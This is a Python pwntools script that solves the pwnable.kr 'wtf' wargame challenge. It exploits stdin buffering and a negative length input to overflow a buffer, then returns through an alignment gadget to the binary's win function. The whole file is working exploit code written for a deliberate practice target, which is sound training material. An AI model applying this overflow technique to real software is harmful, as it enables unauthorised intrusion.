from pwn import *
import argh
import subprocess


'''
this is a challenge in which the problem arises because of stdin buffering the input. in the begining, we read from stdin, and then from fd 0.
the solution is to reach the maximum buffering.
'''


context.arch = 'amd64'
context.log_level = 'debug'
bin_path = './wtf'
e = ELF(bin_path)


ADDR = 'pwnable.kr'
PORT = 9015


gdbscript = '''
# breakpoint on scanf
b *0x40068c
b *0x4006c3
layout regs
continue
'''


def start_gdb(exe_name):
    return gdb.debug([exe_name], gdbscript=gdbscript)


@argh.arg('--local', '-l', help='Run Locally')
@argh.arg('--debug', '-d', help='Run Locally')
@argh.arg('--runpwn', '-r', help='Run Remotly')
def main(local=False, debug=False, runpwn=False):
    p = None

    if local:
        p = process(bin_path)
    elif debug:
        p = start_gdb(bin_path)
    elif runpwn:
        p = remote(ADDR, PORT)

    align_gadget = 0x4004a7
    cyclic_off = 0x6161616161616168

    payload = b'-1\x0a' + cyclic(length=4093) + fit({cyclic_find(p64(cyclic_off), n=8): p64(align_gadget) + p64(e.symbols.win)}) + b'\n'
    log.info('sending: {}'.format(enhex(payload)))
    p.send(payload)
    p.interactive()


if __name__ == '__main__':
    argh.dispatch_command(main)

